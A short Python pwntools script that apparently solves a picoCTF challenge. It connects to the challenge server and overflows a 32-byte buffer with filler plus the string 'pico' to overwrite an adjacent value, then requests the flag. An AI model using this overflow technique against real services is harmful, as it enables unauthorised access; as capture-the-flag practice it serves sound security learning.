#!/usr/bin/env python3
from pwn import *

io = remote("tethys.picoctf.net", 58330)

io.recvuntil(b'Enter your choice: ')
io.sendline(b'2')
io.recvuntil(b'Data for buffer: ')
code = flat([
	b'A'*32,
	b'pico'
	])
io.sendline(code)
io.recvuntil(b'Enter your choice: ')
io.sendline(b'4')
print(io.recvline().decode())
print(io.recvline().decode())



io.interactive()